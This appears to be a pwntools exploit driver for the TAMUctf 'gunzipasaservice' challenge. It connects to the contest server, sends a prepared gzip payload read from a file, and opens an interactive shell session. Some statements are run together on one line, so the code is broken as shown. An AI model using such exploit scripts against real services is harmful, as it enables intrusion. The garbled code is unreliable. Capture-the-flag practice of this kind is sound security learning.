from pwn import *
import os
import subprocess
context.arch="i386"io=remote("challenges.tamuctf.com" ,4709)
#io=process("./gunzipasaservice")
#gdb.attach(io,"set follow-fork-mode child")
proc = subprocess.Popen(["cat input.gz"],stdout=subprocess.PIPE , shell = True)
(out ,err) = proc.communicate()
finp = out
io.sendline(str(finp))io.interactive()
